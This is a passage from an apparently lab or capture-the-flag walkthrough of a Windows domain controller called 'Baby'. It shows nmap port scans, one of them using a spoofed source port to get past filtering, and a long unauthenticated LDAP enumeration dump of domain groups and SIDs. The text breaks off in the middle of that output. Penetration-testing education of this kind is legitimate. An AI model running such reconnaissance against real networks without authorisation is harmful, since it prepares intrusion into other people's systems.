## Baby - Windows

### Enumeration

```bash
nmap -sC -sV -T4 --min-rate 10000 -p- 10.10.65.83 -oA nmap-baby -Pn

PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
88/tcp    open  tcpwrapped
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
3389/tcp  open  tcpwrapped
|_ssl-date: 2024-02-15T10:03:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2024-02-14T09:56:32
|_Not valid after:  2024-08-15T09:56:32
9389/tcp  open  tcpwrapped
49664/tcp open  unknown
49667/tcp open  unknown
49675/tcp open  unknown

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

# With different source port we get some more info

sudo nmap -sC -sV --min-rate 10000 -p- 10.10.65.83 -Pn -g 53

PORT      STATE SERVICE     VERSION
53/tcp    open  domain      Simple DNS Plus
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
389/tcp   open  ldap        Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  tcpwrapped
464/tcp   open  tcpwrapped
636/tcp   open  tcpwrapped
3268/tcp  open  tcpwrapped
3269/tcp  open  tcpwrapped
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2024-02-14T09:56:32
|_Not valid after:  2024-08-15T09:56:32
|_ssl-date: 2024-02-15T10:14:46+00:00; 0s from scanner time.
5985/tcp  open  tcpwrapped
9389/tcp  open  tcpwrapped
49664/tcp open  tcpwrapped
49667/tcp open  tcpwrapped
49668/tcp open  tcpwrapped
49674/tcp open  ncacn_http  Microsoft Windows RPC over HTTP 1.0
49675/tcp open  unknown
59601/tcp open  unknown
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-15T10:14:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```


As we can see there is LDAP running. So we try to enumerate this. 

From Hacktricks (https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap) I've found this:

```bash
nmap -n -sV --script "ldap* and not brute" 10.10.65.83 -Pn

PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-15 10:25:15Z)
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=baby,DC=vl
|       ldapServiceName: baby.vl:babydc$@BABY.VL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=baby,DC=vl
|       serverName: CN=BABYDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=baby,DC=vl
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=baby,DC=vl
|       namingContexts: DC=baby,DC=vl
|       namingContexts: CN=Configuration,DC=baby,DC=vl
|       namingContexts: CN=Schema,CN=Configuration,DC=baby,DC=vl
|       namingContexts: DC=DomainDnsZones,DC=baby,DC=vl
|       namingContexts: DC=ForestDnsZones,DC=baby,DC=vl
|       isSynchronized: TRUE
|       highestCommittedUSN: 32813
|       dsServiceName: CN=NTDS Settings,CN=BABYDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=baby,DC=vl
|       dnsHostName: BabyDC.baby.vl
|       defaultNamingContext: DC=baby,DC=vl
|       currentTime: 20240215102520.0Z
|_      configurationNamingContext: CN=Configuration,DC=baby,DC=vl
| ldap-search: 
|   Context: DC=baby,DC=vl
|     dn: DC=baby,DC=vl
|     dn: CN=Administrator,CN=Users,DC=baby,DC=vl
|     dn: CN=Guest,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Guest
|         description: Built-in account for guest access to the computer/domain
|         distinguishedName: CN=Guest,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:49:52 UTC
|         whenChanged: 2021/11/21 14:49:52 UTC
|         uSNCreated: 8197
|         memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
|         uSNChanged: 8197
|         name: Guest
|         objectGUID: 24e174f1-e6b5-e044-b151-f2192f705df4
|         userAccountControl: 66082
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 514
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-501
|         accountExpires: 30828-09-14T00:57:29+00:00
|         logonCount: 0
|         sAMAccountName: Guest
|         sAMAccountType: 805306368
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
|     dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Domain Computers
|         description: All workstations and servers joined to the domain
|         distinguishedName: CN=Domain Computers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12330
|         uSNChanged: 12332
|         name: Domain Computers
|         objectGUID: e98fa2f2-fd8e-6044-831a-8e32bc266126
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-515
|         sAMAccountName: Domain Computers
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
|     dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
|     dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
|     dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Cert Publishers
|         description: Members of this group are permitted to publish certificates to the directory
|         distinguishedName: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12342
|         memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         uSNChanged: 12344
|         name: Cert Publishers
|         objectGUID: 13c6fc7-98d2-2745-b85f-19cb164f1c19
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-517
|         sAMAccountName: Cert Publishers
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
|     dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Domain Users
|         description: All domain users
|         distinguishedName: CN=Domain Users,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12348
|         memberOf: CN=Users,CN=Builtin,DC=baby,DC=vl
|         uSNChanged: 12350
|         name: Domain Users
|         objectGUID: 50d8b4ca-106d-9e4c-91ab-39be11a5b9e
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-513
|         sAMAccountName: Domain Users
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Domain Guests
|         description: All domain guests
|         distinguishedName: CN=Domain Guests,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12351
|         memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
|         uSNChanged: 12353
|         name: Domain Guests
|         objectGUID: 2610ffed-8342-a246-bae7-9bcc489d99c3
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-514
|         sAMAccountName: Domain Guests
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Group Policy Creator Owners
|         description: Members in this group can modify group policy for the domain
|         member: CN=Administrator,CN=Users,DC=baby,DC=vl
|         distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12354
|         memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         uSNChanged: 12391
|         name: Group Policy Creator Owners
|         objectGUID: d0aba85b-8d33-214f-afa8-893badb23f9
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-520
|         sAMAccountName: Group Policy Creator Owners
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: RAS and IAS Servers
|         description: Servers in this group can access remote access properties of users
|         distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12357
|         uSNChanged: 12359
|         name: RAS and IAS Servers
|         objectGUID: 851217c0-e1b6-3f4b-a24b-14cc4d04547
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-553
|         sAMAccountName: RAS and IAS Servers
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Allowed RODC Password Replication Group
|         description: Members in this group can have their passwords replicated to all read-only domain controllers in the domain
|         distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12402
|         uSNChanged: 12404
|         name: Allowed RODC Password Replication Group
|         objectGUID: 26b327a-be6c-8344-a875-344eb415a428
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-571
|         sAMAccountName: Allowed RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Denied RODC Password Replication Group
|         description: Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
|         member: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
|         member: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
|         member: CN=Domain Admins,CN=Users,DC=baby,DC=vl
|         member: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
|         member: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
|         member: CN=Schema Admins,CN=Users,DC=baby,DC=vl
|         member: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
|         member: CN=krbtgt,CN=Users,DC=baby,DC=vl
|         distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12405
|         uSNChanged: 12433
|         name: Denied RODC Password Replication Group
|         objectGUID: 1c915516-23d2-da43-bee2-cdd9b59d2a9
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-572
|         sAMAccountName: Denied RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
|     dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Enterprise Read-only Domain Controllers
|         description: Members of this group are Read-Only Domain Controllers in the enterprise
|         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12429
|         uSNChanged: 12431
|         name: Enterprise Read-only Domain Controllers
|         objectGUID: 161d755-7efd-414e-a4b-51abb86961b
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-498
|         sAMAccountName: Enterprise Read-only Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483640
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Cloneable Domain Controllers
|         description: Members of this group that are domain controllers may be cloned.
|         distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12440
|         uSNChanged: 12442
|         name: Cloneable Domain Controllers
|         objectGUID: 766271-3f7a-934c-8a2-1e475f8d65a
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-522
|         sAMAccountName: Cloneable Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Protected Users
|         description: Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
|         distinguishedName: CN=Protected Users,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12445
|         uSNChanged: 12447
|         name: Protected Users
|         objectGUID: e3fc4f1f-829d-984c-9ffb-7ada56bab0eb
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-525
|         sAMAccountName: Protected Users
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
| 
| 
|_Result limited to 20 objects (see ldap.maxobjects)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
| ldap-search: 
|   Context: DC=baby,DC=vl
|     dn: DC=baby,DC=vl
|     dn: CN=Configuration,DC=baby,DC=vl
|     dn: CN=Schema,CN=Configuration,DC=baby,DC=vl
|     dn: CN=Administrator,CN=Users,DC=baby,DC=vl
|     dn: CN=Guest,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Guest
|         description: Built-in account for guest access to the computer/domain
|         distinguishedName: CN=Guest,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:49:52 UTC
|         whenChanged: 2021/11/21 14:49:52 UTC
|         uSNCreated: 8197
|         memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
|         uSNChanged: 8197
|         name: Guest
|         objectGUID: 24e174f1-e6b5-e044-b151-f2192f705df4
|         userAccountControl: 66082
|         primaryGroupID: 514
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-501
|         sAMAccountName: Guest
|         sAMAccountType: 805306368
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
|     dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Domain Computers
|         description: All workstations and servers joined to the domain
|         distinguishedName: CN=Domain Computers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12330
|         uSNChanged: 12332
|         name: Domain Computers
|         objectGUID: e98fa2f2-fd8e-6044-831a-8e32bc266126
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-515
|         sAMAccountName: Domain Computers
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
|     dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
|     dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
|     dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Cert Publishers
|         description: Members of this group are permitted to publish certificates to the directory
|         distinguishedName: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12342
|         memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         uSNChanged: 12344
|         name: Cert Publishers
|         objectGUID: 13c6fc7-98d2-2745-b85f-19cb164f1c19
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-517
|         sAMAccountName: Cert Publishers
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
|     dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Domain Users
|         description: All domain users
|         distinguishedName: CN=Domain Users,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12348
|         memberOf: CN=Users,CN=Builtin,DC=baby,DC=vl
|         uSNChanged: 12350
|         name: Domain Users
|         objectGUID: 50d8b4ca-106d-9e4c-91ab-39be11a5b9e
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-513
|         sAMAccountName: Domain Users
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Domain Guests
|         description: All domain guests
|         distinguishedName: CN=Domain Guests,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12351
|         memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
|         uSNChanged: 12353
|         name: Domain Guests
|         objectGUID: 2610ffed-8342-a246-bae7-9bcc489d99c3
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-514
|         sAMAccountName: Domain Guests
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Group Policy Creator Owners
|         description: Members in this group can modify group policy for the domain
|         member: CN=Administrator,CN=Users,DC=baby,DC=vl
|         distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12354
|         memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         uSNChanged: 12391
|         name: Group Policy Creator Owners
|         objectGUID: d0aba85b-8d33-214f-afa8-893badb23f9
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-520
|         sAMAccountName: Group Policy Creator Owners
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: RAS and IAS Servers
|         description: Servers in this group can access remote access properties of users
|         distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12357
|         uSNChanged: 12359
|         name: RAS and IAS Servers
|         objectGUID: 851217c0-e1b6-3f4b-a24b-14cc4d04547
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-553
|         sAMAccountName: RAS and IAS Servers
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
|         dSCorePropagationData: 1601/01/01 00:04:17 UTC
|     dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         objectClass: top
|         objectClass: group
|         cn: Allowed RODC Password Replication Group
|         description: Members in this group can have their passwords replicated to all read-only domain controllers in the domain
|         distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
|         instanceType: 4
|         whenCreated: 2021/11/21 14:51:58 UTC
|         whenChanged: 2021/11/21 14:51:58 UTC
|         uSNCreated: 12402
|         uSNChanged: 12404
|         name: Allowed RODC Password Replication Group
|         objectGUID: 26b327a-be6c-8344-a875-344eb415a428
|         objectSid: 1-5-21-1407081343-4001094062-1444647654-571
|         sAMAccountName: Allowed RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
|         dSCorePropagationData: 2021/11/21 16:30:13 UTC
|         dSCorePropagationData: 2021/11/21 14:51:59 UTC
